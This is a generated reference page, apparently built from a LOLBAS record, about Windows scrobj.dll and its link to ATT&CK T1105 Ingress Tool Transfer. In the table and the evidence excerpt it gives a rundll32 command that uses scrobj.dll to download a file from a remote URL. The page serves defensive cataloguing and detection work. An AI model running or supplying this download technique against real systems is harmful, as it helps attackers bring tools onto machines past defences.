---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Scrobj.dll

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `scrobj.dll` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Scrobj.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Windows Script Component Runtime

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/scrobj.dll.md)
- Source verification: [source record](../../sources/lolbas/scrobj.dll.md)

## Aliases

- `Scrobj.dll`
- `scrobj.dll`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/scrobj.dll.md)

## Source Verification

[source record](../../sources/lolbas/scrobj.dll.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@eral4m'
Person: Eral4m
Author: Eral4m
Commands:
- Category: Download
Command: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
Description: Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.
```
